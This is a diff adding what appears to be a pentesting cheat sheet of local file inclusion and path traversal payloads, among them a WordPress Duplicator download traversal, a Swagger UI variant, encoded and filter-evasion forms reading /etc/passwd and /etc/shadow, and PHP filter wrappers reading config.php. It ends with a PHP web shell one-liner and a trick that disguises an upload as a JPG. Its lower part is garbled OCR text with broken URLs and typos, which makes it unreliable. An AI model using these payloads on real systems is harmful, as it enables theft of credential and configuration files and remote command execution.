@@ -1,0 +1,96 @@
+
+wp-admin/admin-ajax.php?action=duplicator_download&file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+Swagger UI  LFI Injection by @cycatz 
+
+LFI Payload:
+
+/v1/docs//..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\/etc/passwd HTTP/1.1 
+
+%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpassw
+
+
+https://abc.redact.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c
+.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./etc/passwd
+
+http://xyz.com/index.php?page=../../../../../../../../../etc/passwd
+
+http://xyz.com/index.php?page=../../../../../../../../../etc/passwd%00(null byte)
+
+http://xyz.com/index.php?page=../../../../../../../../../etc/passwd%2500(null byte with url encode)
+
+http://xyz.com/index.php?page=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd(url encoding)
+
+http://xyz.com/index.php?page=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd(double url encoding)
+
+http://xyz.com/index.php?page=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==(base 64)
+
+[7] Filter Evasion-1:
+
+http://xyz.com/index.php?page=../\../\../\../\../\../\../\etc/passwd
+
+[8] Filter Evasion-2:
+
+http://xyz.com/index.php?page=..\/..\/..\/..\/..\/..\/..\/etc/passwd
+
+[9] Filter Evasion-3:
+
+http://xyz.com/index.php?page=....//....//....//....//....//etc/passwd
+
+
+    LFI [ PHP wrappers ] Payloads:-
+
+[10] Simple PHP Filter:
+
+http://xyz.com/index.php?page=php://filter/resource=/etc/passwd
+
+[11] PHP ROT-13 Encoded Filter:
+
+http://xyz.com/index.php?page=php://filter/read=string.rot13/resource=/etc/passwd
+
+[12] PHP Base-64 Encoded Filter:
+
+http://xyz.com/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
+
+[13] PHP Base-64 Encoded Filter (Case Insensitive):
+
+http://xyz.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=/etc/passwd
+
+[14] PHP Filters (In Terms of Directory Traversal):
+
+http://xyz.com/index.php?page=php://filter/resource=../../../etc/passwd
+
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+../../../../../../../../../../../../../../etc/passwd
+
+api/file/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
+
+| Basic Payload
+http://example.com/index.php?pages=../../../etc/passwd
+http://example.com/index.php?page=../../../../..]..|..]..].].].].[etc/shadow
+| URL Encoding 'y
+nntpJ/mmplmcomﬁnu.x.pnfp(.‘g-qjoxz-xzmzom-lexz.xza%zmclepmwa
+D] m" |
+http://example.com/index.php?page=%252e%252e%2521%252e%252e%252fetc%252fpasswd
+| UTF-8 Encoding o7
+http://example.cor m’x‘i:ﬁ A'v‘ mmm&hh‘co%nxgn%uhc
+YTl g "
+| Using Null Byh{ﬂ 0)
+http://example.com/index.php2pages../..//et pux
+From an Existent Folder ||
+nw/enmpmco / n SRV AR s 4 ]
+L Y e
+http://example.com/index.php?page=a/.././../../.]..]..]..]../etc/passwd/././.[ADD MORE]/././.
+nup://mmpu,coﬁ/m%%.ﬁ'rﬁmmm/m'
+413 ‘cv#‘z}z EXPERIENCE
+| Using PHP Wrappers: filter ..
+http://example.com/index.php?page=php://filter/read=string.rot13/resource=config.php
+http://example.com/index.php?page=php://filter/convert.baseb4-encode/resource=config.
+php |
+|
+| Using PHP Wrappers: zlib
+http://example.com/index.php?page=php://filter/zlib.deflate/convert.baseé4-encode/
+resource=/etc/shadow
+AELTE L LA ETT TR AT
+echo "<pre><2php system($_GET[cmd']); 2></pre>" > payload.php;
+T
+mv payload.zip shell.jpg;
